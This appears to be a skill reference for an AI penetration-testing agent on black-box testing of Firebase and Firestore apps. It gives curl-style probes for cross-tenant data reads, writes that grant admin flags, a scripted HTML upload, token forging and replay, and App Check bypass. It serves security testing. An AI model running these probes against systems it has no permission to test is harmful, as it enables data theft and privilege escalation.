---
name: Firebase Firestore
description: Reference for black-box testing Firebase / Firestore apps covering Security Rules, Cloud Storage, Cloud Functions, ID-token validation, and App Check bypass.
---

# Firebase / Firestore

Reference for testing Firebase-backed apps over their public REST and Realtime endpoints. Pull this in when the target uses Firebase Auth, Firestore, Realtime Database, Cloud Storage, or Cloud Functions and you need a probe matrix per surface.

> Black-box scope: probes drive the documented Google REST endpoints and Functions URLs with valid / invalid / cross-tenant ID tokens. There is no source-code analysis step.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| All REST probes | `execute_curl` | Bind `Authorization: Bearer <id_token>` for authenticated probes, drop it for anon. |
| Sign in / capture tokens | `execute_playwright` | Record the auth-flow redirect chain to grab `idToken`/`refreshToken` from network. |
| Programmatic Auth REST | `execute_code` | `requests` against `identitytoolkit.googleapis.com`. |
| Decode/forge tokens | `kali_shell jwt_tool` | See `/skill jwt_attacks` for the full JWT matrix. |
| Pull captured config from the graph | `query_graph` | "Return endpoints/responses where body contains 'firebaseConfig' or 'apiKey'." |

## Project config extraction

Open the target in `execute_playwright`, then dump the live config:

```
execute_playwright url: "https://target.tld/" script: |
  page.goto("https://target.tld/")
  print(page.evaluate("() => { try { return firebase.apps[0].options } catch(e) { return null } }"))
```

Or grep the JS bundles:

```
kali_shell: curl -s https://target.tld/static/js/main.*.js | grep -oE '"(apiKey|authDomain|projectId|appId|storageBucket|messagingSenderId|databaseURL)":"[^"]*"' | sort -u
```

Save the project ID as `PROJECT`, API key as `API_KEY`, storage bucket as `BUCKET`.

### Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive this attack from the recorded history instead of re-fetching bundles by hand. `redamon.grep` the captured response bodies for `firebaseConfig`, `apiKey`, `projectId`, or `databaseURL` to pull the live config straight from JS the target already served; `redamon.search {bodyq:"firestore.googleapis.com"}` finds the actual Firestore REST calls the app made, and `redamon.get(id,"both")` shows the exact document path and the ID token in `Authorization`. Feed a captured Firestore GET into `redamon.replay` to rerun it as the wrong principal: `dropHeaders:["Authorization"]` for the anon probe, or `headers:{"Authorization":"Bearer $TOKEN_A"}` against a path scoped to User B (the auth-context swap the differential below needs). Walk document paths by editing `path` in successive `redamon.replay` calls, and use `redamon.params` to spot sequential/uuid document IDs worth enumerating. Then `redamon.diff(owner_id, foreign_id)` gives the owner-vs-foreign response delta directly. Caveats: `redamon.replay` is pinned to the origin host, so cross-project/audience-confusion replays to `firestore.googleapis.com` from a captured first-party call only work when the capture already hit Google directly; and `proxy_brain` only see traffic that went through the capture proxy.

## Endpoint cheatsheet

| Service | URL pattern |
|---|---|
| Firestore REST | `https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/<path>` |
| Realtime DB | `https://$PROJECT.firebaseio.com/<path>.json` |
| Storage REST | `https://firebasestorage.googleapis.com/v0/b/$BUCKET/o[/<path>]` |
| Storage list | `https://firebasestorage.googleapis.com/v0/b/$BUCKET/o?prefix=` |
| Identity Toolkit | `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=$API_KEY` |
| Secure token | `https://securetoken.googleapis.com/v1/token?key=$API_KEY` |
| Cloud Functions (HTTPS) | `https://<region>-$PROJECT.cloudfunctions.net/<fn>` or `https://<custom-domain>` |
| Hosting | `https://$PROJECT.web.app` / `https://$PROJECT.firebaseapp.com` |

ID-token claims to verify (when issued correctly):

```
iss = https://securetoken.google.com/$PROJECT
aud = $PROJECT
sub = <uid>
auth_time, exp, iat
```

## Principal matrix

Capture tokens for every reachable role:

| Principal | How |
|---|---|
| Anonymous (no token) | Drop `Authorization` header |
| Anonymous Auth | If enabled, sign in via `accounts:signUp?key=$API_KEY` |
| User A / User B | Standard signin via `accounts:signInWithPassword` or OAuth provider |
| Custom-claims user | If admin issues custom claims, force-refresh after change |
| Signed-out (expired) | Wait `exp` then replay |

Quick anon signup (when `signUp` is open):

```
execute_curl url: "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" method: "POST" headers: "Content-Type: application/json" data: '{"returnSecureToken":true}'
```

The response contains `idToken`, `refreshToken`, `localId` (uid).

## Firestore probes

Firestore Rules are NOT filters: a query that returns a row the rule denies fails the whole request. List queries leak more than per-doc reads when rules are coarse.

### Rule-gap probes

```
# Anon read on a sensitive collection
execute_curl url: "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/users"

# Authed cross-tenant probe (User A's token, User B's docs)
execute_curl url: "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/orgs/OTHER_ORG/secrets" headers: "Authorization: Bearer $TOKEN_A"

# CollectionGroup query (often bypasses per-collection rules)
execute_curl url: "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents:runQuery" method: "POST" headers: "Authorization: Bearer $TOKEN_A\nContent-Type: application/json" data: '{"structuredQuery":{"from":[{"collectionId":"secrets","allDescendants":true}]}}'
```

### Write-path probes

```
# Create with foreign owner_id
POST .../documents/orders?documentId=mine
  body { "fields": { "ownerId": { "stringValue": "USER_B_UID" }, "amount": { "integerValue": "0" } } }

# Patch a foreign document
PATCH .../documents/orders/FOREIGN_ID?updateMask.fieldPaths=isAdmin
  body { "fields": { "isAdmin": { "booleanValue": true } } }

# Inject privilege fields not in the schema
POST .../documents/users
  body { "fields": { "role": { "stringValue": "admin" }, "tenantId": { "stringValue": "ROOT" } } }
```

### Differential indicators

- Owner returns N rows, foreign returns 0: rule honored.
- Both return same N: list rule is `allow read: if request.auth != null` (broken).
- Owner returns N, foreign returns subset: rule has partial filter; check whether subset crosses tenants.
- Counts via `Prefer: count=exact` (Firestore equivalent: `count` aggregation in `runAggregationQuery`) reveal forbidden rows even when reads are denied.

## Realtime Database probes

```
# Anon read of root
execute_curl url: "https://$PROJECT.firebaseio.com/.json"

# Authed access to specific node
execute_curl url: "https://$PROJECT.firebaseio.com/users/USER_B.json?auth=$TOKEN_A"

# Privilege write
execute_curl url: "https://$PROJECT.firebaseio.com/admins.json?auth=$TOKEN_A" method: "PATCH" data: '{"$UID":true}'
```

`.read: true` / `.write: true` at the root or anywhere up the tree is the cardinal sin. Probe nodes that look privilege-bearing: `admins`, `roles`, `permissions`, `flags`, `internal`.

## Cloud Storage probes

```
# Anonymous public read
execute_curl url: "https://firebasestorage.googleapis.com/v0/b/$BUCKET/o/<encoded_path>?alt=media"

# Public list (often disabled)
execute_curl url: "https://firebasestorage.googleapis.com/v0/b/$BUCKET/o?prefix="

# Signed URL replay across tenants / time
# Capture a working signed URL, share with another principal, watch behavior

# Upload an HTML/SVG and check served Content-Type
PUT .../o?name=evil.html  Content-Type: text/html  body: "<script>...</script>"
GET the URL -> look for X-Content-Type-Options: nosniff and Content-Disposition: attachment
```

Probe `download tokens` in returned URLs (`?token=<uuid>`). Long-lived or non-rotated tokens are a finding; replay across users.

## Cloud Functions probes

| Function flavor | Probe |
|---|---|
| `onRequest` HTTPS | Standard HTTP POST/GET. Verify it validates `Authorization: Bearer` against `iss=securetoken.google.com/$PROJECT`. |
| `onCall` (callable) | `POST https://<region>-$PROJECT.cloudfunctions.net/<fn>` with body `{"data":{...}}`. SDK adds `Authorization` automatically; manual curl reproduces. |
| `onCreate` / `onWrite` triggers | Indirectly invoked: write a document via Firestore, watch for downstream effects. Look for triggers that grant roles based on doc fields. |

Common gaps:

- Trusting `data.uid` / `data.orgId` from request body instead of `context.auth.uid` (callable) or verified token (`onRequest`).
- Skipping ID-token verification on `onRequest` (assumes `context.auth` exists when it doesn't).
- Wide CORS (`Access-Control-Allow-Origin: *` with credentials).
- Returning service-account credentials, signed-URL signing keys, or env-var dumps in error responses.
- Trigger granting admin role from a doc field the client controls.

```
execute_curl url: "https://<region>-$PROJECT.cloudfunctions.net/<fn>" method: "POST" headers: "Authorization: Bearer $TOKEN_A\nContent-Type: application/json" data: '{"data":{"uid":"USER_B_UID","action":"makeAdmin"}}'
```

If the function uses Admin SDK internally, RLS is bypassed; the function is the only enforcement layer.

## Auth and token misuse

| Probe | Outcome |
|---|---|
| Sign in to project A, replay token at project B | Cross-project audience confusion |
| Replay an expired token (`exp` in the past) | Lax verification |
| Forge a token with `iss=securetoken.google.com/OTHER_PROJECT` | Issuer pinning missing |
| Switch between session cookies and ID tokens | Two parallel auth paths drift |
| Custom claims trusted in app code | Modify claim via doc and watch app accept |

Pivot to `/skill jwt_attacks` for the full JWT-side matrix.

## App Check bypass

App Check attests the calling app, not the user. Treat it as anti-abuse, not authorization.

| Probe | Outcome |
|---|---|
| REST direct to `firestore.googleapis.com` with valid ID token but no App Check header | App Check enforced or not |
| Mobile reverse-engineering: replay a captured ID token from a non-attested device | Same data accessible without attestation |

## Tenant isolation

Apps often namespace by `orgs/$ORG/...`. Bind the org server-side via membership doc or custom claim, never from request payload.

```
# Vary tenant header / subdomain / path while keeping JWT fixed
execute_curl url: "https://api.target.tld/orgs/OTHER_ORG/data" headers: "Authorization: Bearer $TOKEN_A"
execute_curl url: "https://other-org.target.tld/data" headers: "Authorization: Bearer $TOKEN_A"
```

## Differential and blind enumeration

- Firestore: error shape (`PERMISSION_DENIED` vs `NOT_FOUND`) reveals doc existence.
- Storage: response time / Content-Length deltas leak signed-URL validity.
- Functions: constant-time error vs variable error reveals auth branch.
- Realtime DB: shallow list (`?shallow=true`) returns key set even when value reads are denied.

## Validation shape

A clean Firebase finding includes:

1. Project config (apiKey, projectId, bucket) extracted from the bundle or page evaluation.
2. The exact REST request that succeeded for the wrong principal.
3. Side-by-side response bodies showing cross-user / cross-tenant data.
4. The Firestore Rules path or Function name implicated.
5. Reproduction with the token's `sub`, `iss`, `aud`, and `exp` claims documented.

## Hand-off

```
firestore probes -> if successful, file as IDOR / Mass Assignment finding
storage probes  -> if public reads, tag as info-disclosure; chain with /skill information_disclosure
function probes  -> token-validation gaps -> pivot to /skill jwt_attacks
auth probes      -> token replay / cross-project -> /skill oauth_oidc, /skill jwt_attacks
```
